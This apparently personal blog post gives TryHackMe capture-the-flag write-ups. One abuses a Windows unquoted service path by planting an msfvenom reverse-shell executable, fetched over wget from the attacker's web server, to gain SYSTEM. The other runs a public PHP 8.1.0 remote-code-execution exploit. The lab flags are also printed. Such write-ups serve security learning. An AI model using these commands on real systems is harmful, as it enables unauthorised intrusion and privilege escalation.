---
layout: ../../layouts/MarkdownPostLayout.astro
title: TryHackMe Challenges
author: Jan Fok
description: "Some vulnerable machines on TryHackMe"
image: 
    url: "data:image/png;base64,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"
    alt: "Thumbnails of websites from the Astro Showcase site."
---

## Quotient
### Category: Windows, Privilege Escalation
### Vulnerability: Unquoted Service Path

We are provided credentials for the user "Sage" to access a remote machine. We were told to use Remote Desktop Protocol (RDP) to connect to the remote machine. I used `xfreerdp` and the following command to accomplish this: 

```bash
xfreerdp /u:sage /p:'[password]' /v:[machine ip]
```

**Enumeration**

Using the command `systeminfo`, we can obtain information about the system. 

Using the `net` command, we can check the group memberships and account information of the user "Sage". We can also use `whoami /priv` to check the privileges of the account. 

From the results of these tests, we can conclude that "Sage" is a low-privileged account.

I was lost to as to what to do, so I read a couple writeups online and learned that from the name and the description of the challenge, there may be an Unquoted Service Path vulnerability on the system.

Next, I ran a service check using Windows Management Instrumentation Command-line (WMIC) using the following command:

```bash
wmic service get name,displayname,pathname,startmode | findstr /i /v "c:\windows\\" | findstr /i /v """
```

The first part of the command will return all the services running on the system. The second part of the command will remove any services which have been put in quotes.

This indeed returns an unquoted service path with the name "Development Service" in path `C:\Program Files\ Development Files\Devservice Files\Service.exe`.

Next, I used the following command to verify the status of the service.

```bash
sc qc "Development Service" -state=all
```

From the results of the command, we can see that the service is set to auto-start, meaning it will be automatically started on system boot/reboot. 

After reading about how an unquoted service path works, I learned that the system will check for the executable in the following order:

1. C:\Program.exe
1. C:\Program Files\Development.exe
1. C:\Program Files\Development Files\Devservice.exe
1. C:\Program Files\Development Files\Devservice Files\Service.exe

We just have to see if we have permissions to write in any of the spaced folders in the filepath. We can check folder permissions using `icalcs` (Integrity Control Access Control LIsts) via the command-line using the following commands:

```bash
icacls "C:\Program Files\Development Files\Devservice Files"

icacls "C:\Program Files\Development Files"
```

From the results, we can see that we do have write access to the "Development Files" folder. Now, we can proceed with our exploitation.

**Exploitation**

We will use `msfvenom` to create a reverse shell executable on our local machine using the following command:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL IP] LPORT=443 -f exe -o Devservice.exe
```

Next, we start a web server using python to host the file with the following command:

```bash
python3 -m http.server
```

Then, we can use `wget` in the remote machine to download the file from our local machine to the target using the following command: 

```powershell
Powershell

wget http://local.machine.ip/8000/Devservice.exe -o "c:\program files\development files\Devservice.exe"
```

We once again use `icacls` to give all users permissions to run the script with the following command:

```powershell
icacls "c:\program files\development files\Devservice.exe" \grant everyone:F
```

Now, we restart the target machine to get windows to auto-run the reverse shell script on boot. When the machine is rebooted, I obtained a reverse shell on my local machine with SYSTEM privileges and was able to obtain the flag from administrator desktop.

**Flag: THM{USPE_SUCCESS}**

---

## Agent T
### Category: WebApp, Privilege Escalation

**Enumeration**

When accessing the provided website with a web browser, I notice that there's nothing special in teh actual html elements. However, when I inspect the HTTP request and response headers, I note that the PHP version was leaked - PHP 8.1.0. 

Googling vulnerabilaties for that version of PHP, I found a vulnerability and script which allowed for remote code execution (RCE) readily available on ExploitDB.

Downloading the python script and running it, I managed to obtain a root shell into the server and obtained the flag in the root directory.

**Flag: flag{4127d0530abf16d6d23973e3df8dbecb}**